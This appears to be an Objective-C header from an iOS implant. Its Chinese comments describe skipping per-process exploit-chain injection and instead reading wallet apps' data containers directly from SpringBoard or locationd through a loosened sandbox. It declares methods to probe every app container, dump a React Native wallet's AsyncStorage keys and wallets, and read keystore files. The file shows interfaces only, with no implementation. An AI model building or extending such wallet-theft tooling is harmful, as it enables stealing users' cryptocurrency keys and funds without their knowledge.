//
//  WalletFS.h — 从 SpringBoard / locationd 直接读钱包 App 的容器
//
//  背景：给钱包单独注入要 135 秒（每个目标进程都要重跑一遍漏洞链）。
//  但我们的 photonote 已经能跨容器读 /var/mobile/Containers/Shared/AppGroup/，
//  说明宿主进程的沙箱是放宽过的。如果 Data 容器也能读，那钱包数据
//  根本不用注入 —— 直接在外面读文件即可，秒级。
//
#import <Foundation/Foundation.h>

@interface WalletFS : NSObject

/// 探测所有 App Data 容器，返回 [ {bundleId, path, readable, files:[...], error} ]
+ (NSArray<NSDictionary *> *)probeAllContainers;

/// 针对一个 bundleId 读它的 AsyncStorage（React Native 钱包用）
/// 返回 @{ @"dir":路径, @"keys":{key:value}, @"wallets":[...], @"error":... }
+ (NSDictionary *)asyncStorageOf:(NSString *)bundleId;

/// 读某个容器下相对路径的文件（用于 Documents/keystore 这类）
+ (NSData *)readFile:(NSString *)relPath inContainer:(NSString *)bundleId;

+ (NSString *)containerPathFor:(NSString *)bundleId;

@end
